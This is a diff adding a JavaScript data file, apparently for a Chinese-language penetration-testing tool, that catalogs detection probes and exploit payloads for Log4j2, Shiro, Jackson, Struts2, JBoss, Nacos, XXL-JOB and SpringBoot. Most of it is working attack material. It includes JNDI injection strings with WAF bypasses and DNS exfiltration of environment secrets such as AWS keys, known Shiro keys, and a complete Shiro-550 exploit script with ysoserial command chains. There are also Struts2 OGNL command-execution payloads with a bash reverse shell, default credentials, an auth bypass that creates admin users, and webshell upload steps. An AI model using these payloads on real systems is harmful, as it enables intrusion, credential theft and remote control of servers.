+    {t:'带环境信息外带',note:'可一次性带出 Java 版本等',p:'${jndi:ldap://${java:version}.{{dns}}/a}',how:'同上'},
+    {t:'带主机名外带',note:'',p:'${jndi:ldap://${env:HOSTNAME}.{{dns}}/a}',how:'同上'},
+    {t:'WAF 绕过：嵌套 lower',note:'<span class="red">绕过简单关键字过滤</span>',p:'${${lower:j}ndi:ldap://{{dns}}/a}',how:'同上'},
+    {t:'WAF 绕过：::-j',note:'',p:'${${::-j}ndi:ldap://{{dns}}/a}',how:'同上'},
+    {t:'WAF 绕过：大小写混淆',note:'',p:'${jNdI:lDaP://{{dns}}/a}',how:'同上'},
+    {t:'WAF 绕过：多层嵌套',note:'',p:'${${lower:${upper:j}}ndi:ldap://{{dns}}/a}',how:'同上'},
+    {t:'WAF 绕过：环境变量拼接',note:'',p:'${jndi:ldap://${env:USER}.{{dns}}/a}',how:'同上'},
+    {t:'影响版本',note:'<span class="red">Log4j2 2.0-beta9 ~ 2.14.1</span>，安全版本 <span class="red">2.17.0+</span>；JDK 8u191+ 默认禁 LDAP 远程类加载，抬高利用门槛',p:'',how:'—'}
+  ]},
+  shiro:{name:'Shiro',items:[
+    {t:'框架存在性检测',note:'响应头出现 <span class="red">rememberMe=deleteMe</span>',p:'Cookie: rememberMe=deleteMe;',how:'任意请求带上该 Cookie'},
+    {t:'Key 爆破（Shiro-550）',note:'<span class="red">拿到 key = 550 可利用</span>。工具内置 50-100+ 已知 key 批量试',
+     p:'kPH+bIxk5D2deZiIxcaaaA==   # Shiro 官方默认（最经典）\n2AvVhdsgUs0FSA3SDFAdag==\n3AvVhmFLUs0KTA3Kprsdag==\n4AvVhmFLUs0KTA3Kprsdag==\nwGiHplamyXlVB11UXWol8g==\nfCq+/xW488hMTCD+cmJ3aQ==\n1QWLxg+NYmxraMoxAXu/Iw==\nZ3VucwAAAAAAAAAAAAAAAA==   # Guns 框架\nU3ByaW5nQmxhZGUAAAAAAA==   # SpringBlade 框架\nZUdsaGJuSmxibVI2ZHc9PQ==\nbWljcm9zAAAAAAAAAAAAAA==\nMWJjNmQ3MjEzMzZjODM2NQ==\nZGVmYXVsdF9jaXBoZXJrZXk=\n2itfHvFqDZF7Htc1vT1wcQ==\nQJpM8T7rSZAGXvF0QwKoQA==',how:'用 ShiroAttack2 / shiro_attack 自动爆破'},
+    {t:'Shiro-721 判定',note:'<span class="red">随机 key + CBC Padding Oracle</span>，需一个合法 RememberMe Cookie 作前缀，逐字节爆破（数千次请求）',p:'',how:'用 Shiro-721 专用脚本，先正常登录拿到合法 rememberMe'},
+    {t:'版本区间',note:'<span class="red">Shiro ≤ 1.2.4 → 550（CVE-2016-4437）；1.2.5 ~ 1.4.1 → 721（CVE-2019-12422）；1.4.2 修复 Padding Oracle</span>',p:'',how:'—'}
+  ]},
+  jackson:{name:'Jackson',items:[
+    {t:'报错指纹探测',note:'发畸形 JSON 看是否回显 <span class="red">com.fasterxml.jackson</span>',p:'{"a":[',how:'POST'},
+    {t:'多态类型开启探测（关键）',note:'<span class="red">服务端接受 @class 并实例化 = 开启 enableDefaultTyping = 高危</span>',p:'{"obj":{"@class":"java.net.Inet4Address","val":"{{dns}}"}}',how:'POST，看 DNSLog'},
+    {t:'依赖版本确认',note:'<span class="red">jackson-databind 2.x &lt; 2.6.7.1 / 2.7.x &lt; 2.7.9.1 / 2.8.x &lt; 2.8.9</span>，建议 &gt;= 2.12/2.13',p:'',how:'WEB-INF/lib 或报错堆栈'}
+  ]},
+  struts2:{name:'Struts2',items:[
+    {t:'无害 OGNL 探测（推荐）',note:'<span class="red">响应里出现标记字符串即存在 OGNL 执行</span>',
+     p:"%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\\ntest\\n\\n'))}",
+     how:'作为 <span class="red">Content-Type</span> 请求头发送（S2-045 探测）'},
+    {t:'算数表达式探测',note:'响应出现 2 即被执行',p:'%{1+1}',how:'参数或 Content-Type'},
+    {t:'版本与编号对照',note:'<span class="red">S2-016 (2.0.0-2.3.15.1) ｜ S2-045/046 (2.3.5-2.3.31, 2.5-2.5.10) ｜ S2-057 (2.3-2.3.34, 2.5-2.5.16) ｜ S2-059 (≤2.5.20) ｜ S2-061 (≤2.5.25) ｜ S2-062 (≤2.5.29) ｜ S2-067 (≤2.5.33, 6.0.0-6.3.0.2)</span><br>总结：<span class="red">Struts 2.0.0 - 2.5.33 基本都有 RCE</span>',p:'',how:'—'}
+  ]},
+  jboss:{name:'JBoss',items:[
+    {t:'路径存在性探测',note:'<span class="red">/invoker/readonly 返回非 404 = CVE-2017-12149 入口存在</span>',p:'',how:'curl -s -o /dev/null -w "%{http_code}" {{target}}/invoker/readonly'},
+    {t:'JMX Console 未授权',note:'<span class="red">默认 admin/admin</span>，可上传 war getshell',p:'',how:'curl -s -u admin:admin {{target}}/jmx-console/'},
+    {t:'JBossMQ JMS',note:'CVE-2017-7504 入口',p:'',how:'curl -s -o /dev/null -w "%{http_code}" {{target}}/jbossmq-httpil/HTTPServerILServlet'},
+    {t:'nmap 版本识别',note:'',p:'',how:'nmap -sV -p 8080,9990 {{target}}'}
+  ]},
+  nacos:{name:'Nacos',items:[
+    {t:'未授权用户枚举',note:'<span class="red">能直接返回用户列表 = 未授权访问</span>',p:'',how:'curl -s "{{target2}}/nacos/v1/auth/users?pageNo=1&pageSize=9"'},
+    {t:'鉴权绕过（CVE-2021-29441）',note:'<span class="red">加 User-Agent: Nacos-Server 绕过认证</span>，影响 1.2.0-1.4.0 / 2.0.0-2.0.2，修复于 1.4.1 / 2.0.3',
+     p:'User-Agent: Nacos-Server',how:'curl -s "{{target2}}/nacos/v1/auth/users?pageNo=1&pageSize=9" -H "User-Agent: Nacos-Server"'},
+    {t:'配置泄露',note:'',p:'',how:'curl -s "{{target2}}/nacos/v1/cs/configs?dataId=&group=&pageNo=1&pageSize=99"'},
+    {t:'默认口令',note:'<span class="red">nacos / nacos</span>',p:'',how:'控制台直接登录'}
+  ]},
+  xxljob:{name:'XXL-JOB',items:[
+    {t:'执行器鉴权探测',note:'<span class="red">返回 "The job trigger request is valid" = 未鉴权高危；"invalid access token" / "The access token is wrong" = 已配 token</span>',
+     p:'{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"","executorBlockStrategy":"COVER_EARLY","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"echo test","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}',
+     how:'POST http://HOST:9999/run，Content-Type: application/json'},
+    {t:'调度中心默认口令',note:'<span class="red">admin / 123456</span>',p:'',how:'登录 /xxl-job-admin/'},
+    {t:'影响版本',note:'执行器未授权 RCE（CVE-2022-4316）<span class="red">≤ 2.3.1</span>；RESTful API 自 2.2.0 引入；2.1.2 及以下走 Hessian 反序列化',p:'',how:'—'}
+  ]},
+  springboot:{name:'SpringBoot',items:[
+    {t:'Actuator 端点枚举',note:'<span class="red">/actuator 返回 JSON 端点列表即泄露</span>',p:'',how:'curl -s {{target}}/actuator'},
+    {t:'env 泄露',note:'<span class="red">可能含数据库密码、AK/SK</span>',p:'',how:'curl -s {{target}}/actuator/env'},
+    {t:'heapdump 泄露',note:'<span class="red">下载后用 JDumpSpider 提取明文凭据</span>',p:'',how:'curl -s -o heapdump.hprof {{target}}/actuator/heapdump'},
+    {t:'Gateway RCE 前置探测',note:'CVE-2022-22947',p:'',how:'curl -s {{target}}/actuator/gateway/routes'}
+  ]}
+};
+
+/* ---------- Payload 生成库 ---------- */
+const PAY = {
+  fastjson:{name:'Fastjson',icon:'📦',items:[
+    {t:'① 1.2.24 经典 JNDI（RMI）',d:'<span class="red">最基础，必须掌握</span>。攻击机需起 RMI/LDAP 服务',
+     p:'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{lhost}}:{{jrmp}}/obj","autoCommit":true}',
+     cmd:'# 1) 攻击机起恶意 RMI/LDAP（marshalsec 或 JNDIExploit）\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://{{lhost}}:8000/#Exploit" {{jrmp}}\n#   LDAP 版本：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{{lhost}}:8000/#Exploit" 1389\n\n# 2) 一键化（推荐）：JNDIExploit\njava -jar JNDIExploit-1.4-SNAPSHOT.jar -i {{lhost}}\n#   然后用：ldap://{{lhost}}:1389/Basic/Command/{{cmd}}'},
+    {t:'② 1.2.24 JNDI（LDAP，更通用）',d:'LDAP 在高版本 JDK 下限制更少',
+     p:'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{lhost}}:1389/Exploit","autoCommit":true}',cmd:''},
+    {t:'③ 1.2.47 java.lang.Class 绕过',d:'<span class="red">1.2.24 ~ 1.2.47 专用</span>，先加载 Class 再实例化，绕过 autoType 黑名单',
+     p:'{\n  "a":{\n    "@type":"java.lang.Class",\n    "val":"com.sun.rowset.JdbcRowSetImpl"\n  },\n  "b":{\n    "@type":"com.sun.rowset.JdbcRowSetImpl",\n    "dataSourceName":"ldap://{{lhost}}:1389/Exploit",\n    "autoCommit":true\n  }\n}',cmd:''},
+    {t:'④ 1.2.68 java.lang.AutoCloseable 绕过',d:'<span class="red">1.2.48 ~ 1.2.68 专用</span>',
+     p:'{\n  "@type":"java.lang.AutoCloseable",\n  "@type":"com.sun.rowset.JdbcRowSetImpl",\n  "dataSourceName":"ldap://{{lhost}}:1389/Exploit",\n  "autoCommit":true\n}',cmd:''},
+    {t:'⑤ 1.2.80 java.lang.Exception 绕过',d:'<span class="red">1.2.73 ~ 1.2.80 专用</span>',
+     p:'{\n  "@type":"java.lang.Exception",\n  "@type":"com.sun.rowset.JdbcRowSetImpl",\n  "dataSourceName":"ldap://{{lhost}}:1389/Exploit",\n  "autoCommit":true\n}',cmd:''},
+    {t:'⑥ Unicode 编码绕 WAF',d:'把 @type 等关键字转成 \\uXXXX，绕过简单关键字过滤',
+     p:'{"name":{"\\u0040\\u0074\\u0079\\u0070\\u0065":"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073","\\u0076\\u0061\\u006c":"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c"},"x":{"\\u0040\\u0074\\u0079\\u0070\\u0065":"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c","\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065":"ldap://{{lhost}}:1389/Exploit","autoCommit":true}}',cmd:''},
+    {t:'⑦ BCEL 不出网（Tomcat / Spring Boot 首选）',d:'<span class="red">目标不出网时的首选链</span>：依赖 tomcat-dbcp.jar，JDK &lt; 8u251，无需特殊 Feature。<br>把 <span class="red">$$BCEL$$...</span> 换成恶意类的 BCEL 编码（用 BcelPayloadGenerator / fastJsonNoNetTool 生成）',
+     p:'{\n  "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",\n  "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$...",\n  "driverClassLocation":""\n}',
+     cmd:'# 生成 BCEL 编码：\n#   工具1：https://github.com/OneSourceCat/BcelPayloadGenerator\n#   工具2：https://github.com/yeyeye888/fastJsonNoNetTool  (GUI)\n# 注意：Spring Boot 1.x 用 org.apache.tomcat.dbcp.dbcp.BasicDataSource\n#       Spring Boot 2.x 用 org.apache.tomcat.dbcp.dbcp2.BasicDataSource'},
+    {t:'⑧ TemplatesImpl 不出网（需 SupportNonPublicField）',d:'纯 JDK，但<strong>必须目标开启了 SupportNonPublicField</strong>，场景较少',
+     p:'{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["<恶意类字节码Base64>"],"_name":"a.b","_tfactory":{},"_outputProperties":{}}',
+     cmd:'# 需配合 Feature.SupportNonPublicField；_bytecodes 为恶意类字节码的 Base64'},
+    {t:'⑨ C3P0 二次序列化',d:'依赖 c3p0.jar，作为绕过 AutoType 的辅助链',
+     p:'{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:<恶意序列化数据Hex>;"}',cmd:''},
+    {t:'⑩ 1.2.83（Spring Boot Fat Jar 环境）',d:'<span class="red">利用 @type 处理逻辑触发远程类加载，LaunchedURLClassLoader 加载恶意类</span>',
+     p:'{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{dns}}"}}}',
+     cmd:'# 详见：https://mp.weixin.qq.com/s/OCtxMaVOnaKbNhvhhgKwVg'},
+    {t:'⑪ 不出网探测：延时判断',d:'Payload 中触发 Thread.sleep，用响应时间差判断漏洞',
+     p:'{"@type":"java.net.Inet4Address","val":"137.30.0.1"}',cmd:'# 对比访问 127.0.0.1 与不常见外网 IP 的响应时间差'},
+    {t:'⑫ 不出网探测：写静态文件回显',d:'有文件写权限时，把命令结果写到 Web 目录静态文件再 HTTP 读取',
+     p:'{{cmd}} > /path/to/webroot/result.txt',cmd:''}
+  ]},
+  log4j2:{name:'Log4j2',icon:'📝',items:[
+    {t:'① 基础 JNDI（LDAP）',d:'<span class="red">最经典</span>',p:'${jndi:ldap://{{lhost}}:1389/Exploit}',
+     cmd:'# 攻击机起恶意 LDAP：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{{lhost}}:8000/#Exploit"\n# 或一键：\njava -jar JNDIExploit-1.4-SNAPSHOT.jar -i {{lhost}}'},
+    {t:'② 基础 JNDI（RMI）',d:'',p:'${jndi:rmi://{{lhost}}:{{jrmp}}/Exploit}',cmd:''},
+    {t:'③ DNSLog 验证（无害探测）',d:'只验证存在性，不执行代码',p:'${jndi:ldap://{{dns}}/a}',cmd:''},
+    {t:'④ 绕过 WAF 变体合集',d:'逐个试，绕过关键字过滤',
+     p:'${${lower:j}ndi:ldap://{{lhost}}:1389/Exploit}\n${${::-j}ndi:ldap://{{lhost}}:1389/Exploit}\n${jNdI:lDaP://{{lhost}}:1389/Exploit}\n${${lower:${upper:j}}ndi:ldap://{{lhost}}:1389/Exploit}\n${${env:ENV_NAME:-j}ndi:ldap://{{lhost}}:1389/Exploit}',cmd:''},
+    {t:'⑤ 信息外带（不出网拿数据）',d:'把敏感信息拼进域名，从 DNSLog 记录里读',
+     p:'${jndi:ldap://${java:version}.{{dns}}/a}\n${jndi:ldap://${env:USER}.{{dns}}/a}\n${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.{{dns}}/a}',cmd:''},
+    {t:'⑥ 一键利用命令',d:'',p:'',
+     cmd:'# 推荐：JNDIExploit（内置 LDAP/RMI + 命令执行）\njava -jar JNDIExploit-1.4-SNAPSHOT.jar -i {{lhost}}\n# 然后打：\n${jndi:ldap://{{lhost}}:1389/Basic/Command/{{cmd}}}\n${jndi:ldap://{{lhost}}:1389/Basic/ReverseShell/{{lhost}}/{{lport}}}\n${jndi:ldap://{{lhost}}:1389/Basic/TomcatMemshell1}'}
+  ]},
+  shiro:{name:'Shiro',icon:'🔐',items:[
+    {t:'① 完整利用命令（Shiro-550，默认 Key）',d:'<span class="red">最完整的实战命令序列</span>。依赖 ysoserial-all.jar（需 JDK 8 运行）',
+     p:'',
+     cmd:'# ===== 步骤 1：攻击机起 JRMP 监听（10099）=====\njava -cp ysoserial-all.jar ysoserial.exploit.JRMPListener {{jrmp}} CommonsCollections5 \\\n  "{{bashifs_shell}}"\n\n# ===== 步骤 2：另开终端监听反弹 shell =====\nnc -lvvp {{lport}}\n\n# ===== 步骤 3：生成 rememberMe Cookie =====\npython3 shiropoc.py {{lhost}}:{{jrmp}}\n\n# ===== 步骤 4：Burp / curl 带上 Cookie 发请求 =====\ncurl -s "{{target}}/doLogin" -H "Cookie: rememberMe=<上面生成的值>" -d "username=a&password=b&rememberme=remember-me"'},
+    {t:'② shiropoc.py 源码（可直接保存运行）',d:'<span class="red">把下面的脚本存成 shiropoc.py</span>，与 ysoserial-all.jar 放同一目录，python3 运行。<br>依赖：<span class="red">apt install python3-pycryptodome</span> 或 <span class="red">pip3 install pycryptodome</span>',
+     p:'import sys, uuid, base64, subprocess\nfrom Crypto.Cipher import AES\n\ndef encode_rememberme(command):\n    popen = subprocess.Popen([\'java\', \'-jar\', \'ysoserial-all.jar\', \'JRMPClient\', command],\n                             stdout=subprocess.PIPE)\n    BS = AES.block_size\n    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n    key = base64.b64decode("{{key}}")\n    iv = uuid.uuid4().bytes\n    encryptor = AES.new(key, AES.MODE_CBC, iv)\n    file_body = pad(popen.stdout.read())\n    return base64.b64encode(iv + encryptor.encrypt(file_body))\n\nif __name__ == \'__main__\':\n    payload = encode_rememberme(sys.argv[1])\n    print("rememberMe={0}".format(payload.decode()))',
+     cmd:'# 用法：python3 shiropoc.py {{lhost}}:{{jrmp}}'},
+    {t:'③ 记得手动加 Cookie 检测',d:'探测框架是否存在',p:'Cookie: rememberMe=deleteMe;',cmd:'curl -s -i "{{target}}" -H "Cookie: rememberMe=deleteMe;" | grep -i rememberMe'},
+    {t:'④ 已知 Key 字典（爆破用）',d:'<span class="red">ShiroAttack2 / shiro_attack 内置 50-100+ 个</span>，以下是高频项',
+     p:'kPH+bIxk5D2deZiIxcaaaA==   # Shiro 官方默认（最经典）\n2AvVhdsgUs0FSA3SDFAdag==\n3AvVhmFLUs0KTA3Kprsdag==\n4AvVhmFLUs0KTA3Kprsdag==\nwGiHplamyXlVB11UXWol8g==\nfCq+/xW488hMTCD+cmJ3aQ==\n1QWLxg+NYmxraMoxAXu/Iw==\nZ3VucwAAAAAAAAAAAAAAAA==   # Guns\nU3ByaW5nQmxhZGUAAAAAAA==   # SpringBlade\nZUdsaGJuSmxibVI2ZHc9PQ==\nbWljcm9zAAAAAAAAAAAAAA==\nMWJjNmQ3MjEzMzZjODM2NQ==\nZGVmYXVsdF9jaXBoZXJrZXk=\n2itfHvFqDZF7Htc1vT1wcQ==\nQJpM8T7rSZAGXvF0QwKoQA==',cmd:''},
+    {t:'⑤ 利用链选择',d:'<span class="red">CC 链（CommonsCollections 1~7）与 CB 链（CommonsBeanutils1）</span>。目标 JDK 高时优先 CB1 或 CC5/CC6/CC7',
+     p:'CommonsCollections5 / CommonsCollections6 / CommonsCollections7 / CommonsBeanutils1',
+     cmd:'# 列可用链：java -jar ysoserial-all.jar\n# 常用组合（Shiro 场景）：\n#   Shiro + commons-beanutils → CommonsBeanutils1\n#   Shiro + commons-collections → CommonsCollections5/6/7'},
+    {t:'⑥ Shiro-721',d:'<span class="red">随机 key，Padding Oracle 逐字节爆破</span>。需要一个合法 rememberMe 作为前缀，发数千次请求',
+     p:'',cmd:'# 工具：Shiro-721 专用脚本 / ShiroExploit\n# 前置：先正常登录并勾选 Remember me，从响应里拿到合法的 rememberMe Cookie'},
+    {t:'⑦ Shiro 不出网',d:'<span class="red">注入内存马 / 写后门文件 / 命令执行后横向</span>；或把结果写入 Web 目录静态文件再 HTTP 读取',
+     p:'',cmd:'# 不出网思路：\n# 1. 用 CommonsBeanutils1 + 内存马（如 Tomcat 回显链）\n# 2. 命令结果写 /webapp/result.txt 再 curl 读取\n# 3. ShiroAttack2 / shiro_attack 自带回显链与内存马功能'}
+  ]},
+  jboss:{name:'JBoss',icon:'☕',items:[
+    {t:'① CVE-2017-12149 完整利用（/invoker/readonly）',d:'<span class="red">最经典 JBoss 反序列化</span>。注意：<span class="red">Runtime.exec 按空白 tokenize、不经过 shell</span>，反弹命令要把空格换成 <span class="red">${IFS}</span>（下方命令已自动换好）',
+     p:'',
+     cmd:'# 1) 生成 payload（必须用 JDK 8 跑 ysoserial）\njava -jar ysoserial-all.jar CommonsCollections5 \\\n  "{{bashifs_shell}}" > payload.ser\n\n# 2) 攻击机监听\nnc -lvnp {{lport}}\n\n# 3) 发送（POST body 为序列化字节）\ncurl -X POST --data-binary @payload.ser {{target}}/invoker/readonly\n\n# JDK 版本高时换链：CommonsCollections5 / 6 / 7'},
+    {t:'② CVE-2017-7504（JBossMQ JMS）',d:'入口 <span class="red">/jbossmq-httpil/HTTPServerILServlet</span>',p:'',
+     cmd:'java -jar ysoserial-all.jar CommonsCollections5 "{{cmd}}" > p.ser\ncurl -X POST --data-binary @p.ser {{target}}/jbossmq-httpil/HTTPServerILServlet'},
+    {t:'③ JMX Console 未授权 → 上传 war getshell',d:'<span class="red">默认 admin/admin</span>',p:'',
+     cmd:'# 1) 访问 {{target}}/jmx-console/ 用 admin/admin 登录\n# 2) 找 jboss.admin → DeploymentFileRepository → store()\n# 3) 上传 war 包（冰蝎/哥斯拉）后访问 /shell.war'},
+    {t:'④ 临时 JDK 8（不装系统环境）',d:'高版本 JDK 跑不了 ysoserial 时',p:'',
+     cmd:'wget https://github.com/adoptium/temurin8-binaries/releases/download/jdk8u412-b08/OpenJDK8U-jdk_x64_linux_hotspot_8u412b08.tar.gz\ntar -xf OpenJDK8U-jdk_x64_linux_hotspot_8u412b08.tar.gz\ncd jdk8u*/bin\n./java -jar ysoserial-all.jar CommonsCollections5 "{{cmd}}" > payload.ser'}
+  ]},
+  struts2:{name:'Struts2',icon:'🎭',items:[
+    {t:'① S2-045 / S2-046（CVE-2017-5638）命令执行',d:'<span class="red">无需认证，Content-Type 头注入 OGNL，最经典</span>。影响 2.3.5-2.3.31 / 2.5-2.5.10',
+     p:"%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{{cmd}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
+     cmd:'curl -s -X POST "{{target}}/index.action" \\\n  -H "Content-Type: <上面的 payload>"'},
+    {t:'② S2-045 无害探测',d:'<span class="red">响应里出现标记字符串即存在</span>，不执行命令，安全',
+     p:"%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\\ntest\\n\\n'))}",
+     cmd:'curl -s -X POST "{{target}}/index.action" -H "Content-Type: <上面的 payload>" | head'},
+    {t:'③ S2-045 反弹 Shell',d:'把 #cmd 换成反弹命令',
+     p:"%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",cmd:''},
+    {t:'④ S2-057（CVE-2018-11776）URL 命名空间注入',d:'未正确配置 alwaysSelectFullNamespace 时，<span class="red">URL 命名空间被双次 OGNL 解析</span>。影响 2.3-2.3.34 / 2.5-2.5.16',
+     p:'/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\'struts.valueStack\'].context).(#cr=#ct[\'com.opensymphony.xwork2.ActionContext.container\']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=\'{{cmd}}\').(#p=new java.lang.ProcessBuilder(new java.lang.String[]{\'/bin/bash\',\'-c\',#cmd})).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}/actionChain1.action',
+     cmd:'curl -s "{{target}}/上面payload/index.action"'},
+    {t:'⑤ S2-016（CVE-2013-2251）参数注入',d:'影响 2.0.0-2.3.15.1，经典早期 RCE',
+     p:'?redirect:${#resp=@org.apache.struts2.ServletActionContext@getResponse(),#req=@org.apache.struts2.ServletActionContext@getRequest(),#a=#resp.getWriter(),#a.print(new java.lang.ProcessBuilder(new java.lang.String[]{\'/bin/bash\',\'-c\',\'{{cmd}}\'}).start().getInputStream())}',cmd:''},
+    {t:'⑥ 一句话命令执行（简化版）',d:'',p:"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='{{cmd}}').(#p=new java.lang.ProcessBuilder({'/bin/bash','-c',#cmd})).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",cmd:''}
+  ]},
+  nacos:{name:'Nacos',icon:'⚙️',items:[
+    {t:'① 默认口令登录',d:'<span class="red">nacos / nacos</span>',p:'',cmd:'curl -s -X POST "{{target2}}/nacos/v1/auth/users/login" -d "username=nacos&password=nacos"'},
+    {t:'② 鉴权绕过（CVE-2021-29441）',d:'<span class="red">加 User-Agent: Nacos-Server 绕过认证</span>',p:'User-Agent: Nacos-Server',
+     cmd:'curl -s "{{target2}}/nacos/v1/auth/users?pageNo=1&pageSize=9" -H "User-Agent: Nacos-Server"'},
+    {t:'③ 任意添加用户',d:'绕过鉴权后创建管理员',
+     p:'',cmd:'curl -s -X POST "{{target2}}/nacos/v1/auth/users" -H "User-Agent: Nacos-Server" -d "username=test&password=test"'},
+    {t:'④ 配置泄露',d:'<span class="red">拿到数据库密码、各种密钥</span>',p:'',
+     cmd:'curl -s "{{target2}}/nacos/v1/cs/configs?dataId=&group=&pageNo=1&pageSize=99" -H "User-Agent: Nacos-Server"'},
+    {t:'⑤ Derby 数据库 RCE',d:'<span class="red">≤ 2.2.0</span>，需先有管理员权限。写入恶意 SQL 加载 Java 类',
+     p:'CREATE FUNCTION func1() RETURNS VARCHAR PARAMETER STYLE JAVA LANGUAGE JAVA EXTERNAL NAME \' evil.class:method\'',
+     cmd:'# 一键工具：NacosExploitGUI / nacosRce\n# 原理：通过配置中心写入恶意 Derby SQL → 加载恶意 Java 类 → 执行系统命令'},
+    {t:'⑥ Nacos 3.x UserControllerV3 未授权创建管理员',d:'QVD-2026-59388',p:'',cmd:'# 参考：https://mp.weixin.qq.com/s/ctjM6GArI31NBloU8zygbw'}
+  ]},
+  xxljob:{name:'XXL-JOB',icon:'⏰',items:[
+    {t:'① 执行器未授权 RCE（POST /run）',d:'<span class="red">最高危：执行器无 accessToken 时直接命令执行</span>',
+     p:'{\n  "jobId": 1,\n  "executorHandler": "demoJobHandler",\n  "executorParams": "demoJobHandler",\n  "executorBlockStrategy": "COVER_EARLY",\n  "executorTimeout": 0,\n  "logId": 1,\n  "logDateTime": 1586629003729,\n  "glueType": "GLUE_SHELL",\n  "glueSource": "{{cmd}}",\n  "glueUpdatetime": 1586699003758,\n  "broadcastIndex": 0,\n  "broadcastTotal": 0\n}',
+     cmd:'curl -s -X POST "http://HOST:9999/run" \\\n  -H "Content-Type: application/json" \\\n  -d \'<上面的 JSON>\''},
+    {t:'② 执行器反弹 Shell',d:'glueSource 换成反弹命令',
